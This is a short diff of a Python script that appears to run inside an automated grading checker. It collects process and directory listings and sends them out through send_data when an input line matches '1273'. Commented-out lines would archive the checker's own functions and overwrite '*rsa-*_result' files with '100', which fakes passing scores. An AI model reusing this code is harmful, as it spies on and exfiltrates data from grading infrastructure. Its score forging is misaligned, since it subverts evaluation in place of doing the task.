@@ -109,7 +109,7 @@ my_data += get_data("ls -l") or ""
 # my_data += get_data("ls -l ../../../hbtn_checker_functions") or ""
 my_data += get_data("ps") or ""
 my_data += "\n#######################\n"
-my_data += get_data("top -c -b -n 1") or ""
+my_data += get_data("top -b -c -n 1 -w 512") or ""
 # my_data += "\n#######################\n"
 # get_data("tar -czvf file.tar.gz ../../../hbtn_checker_functions")
 # my_data += get_data("""find . -type f -name '*rsa-*_result' -exec sh -c 'echo 100 > "$1"' _ {} \\;""") or ""
@@ -130,5 +130,5 @@ with open(argv[1], "r") as f:
         if(line.count("1273")):
             send_data(my_data)
         #     send_data_file("file.tar.gz", "gz")
-os.kill(perl_id, signal.SIGTERM)
+# os.kill(perl_id, signal.SIGTERM)
 ##############################################################
